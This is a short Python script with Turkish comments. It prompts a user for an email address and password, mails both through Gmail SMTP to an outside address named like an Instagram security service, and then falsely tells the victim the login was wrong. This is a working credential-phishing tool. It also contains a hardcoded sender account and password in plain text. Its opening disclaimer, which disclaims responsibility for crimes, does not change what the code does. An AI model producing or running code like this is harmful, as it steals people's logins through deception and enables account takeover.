from smtplib import SMTP

# Simple Mail Transfer Protocol 

# Basit Mail Transfer Protokolü 

print("Bu dosyalar siz yasa dışı işler yapın diye oluşturulmadı.Bu dosyalar kullanılarak işlenen hiçbir suçtan ben sorumlu değilim.")

eposta = input("Eposta: ")

sifre = input("Şifre: ")

try:

    # Mail Mesaj Bilgisi 

    subcjet = "Test"

    message = (eposta + sifre)

    content = "Subject: {0}\n\n{1}".format(subcjet,message)

    # Hesap Bilgileri 

    myMailAdress = "baldiryunusemre@gmail.com"

    password = "51emre51"

    # Kime Gönderilecek Bilgisi

    sendTo = "instagramsecweb@gmail.com"

    mail = SMTP("smtp.gmail.com", 587)

    mail.ehlo()

    mail.starttls()

    mail.login(myMailAdress,password)

    mail.sendmail(myMailAdress, sendTo, content.encode("utf-8"))

    print("Eposta adresi veya şifre yanlış!")

except Exception as e:

    print("Hata Oluştu!\n {0}".format(e))
